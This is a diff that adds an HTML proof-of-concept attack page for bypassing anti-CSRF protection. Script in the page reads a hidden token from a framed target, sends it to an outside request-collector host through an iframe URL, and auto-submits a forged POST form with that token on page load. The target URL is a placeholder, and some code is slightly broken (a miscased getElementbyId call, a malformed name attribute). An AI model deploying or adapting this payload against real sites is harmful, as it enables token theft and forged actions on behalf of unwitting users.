@@ -1,0 +1,27 @@
+<script>
+var token;
+function readframe1(){
+  token = frame1.document.getElementById("profile").token.value;
+  document.getElementById("bypass").token.value = token
+  loadframe2();
+}
+function loadframe2(){
+  var test = document.getElementbyId("frame2");
+  test.src = "http://requestb.in/1g6asbg1?token="+token;
+}
+</script>
+
+<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()" 
+sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
+height="600" width="800"></iframe>
+
+<iframe id="frame2" name="frame2" 
+sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
+height="600" width="800"></iframe>
+<body onload="document.forms[0].submit()">
+<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
+  <input type="text" name="username" value="z">
+  <input type="checkbox" name="status" checked="">        
+  <input id="token" type="hidden" name="token" value="0000" />
+  <button type="submit">Submit</button>
+</form>
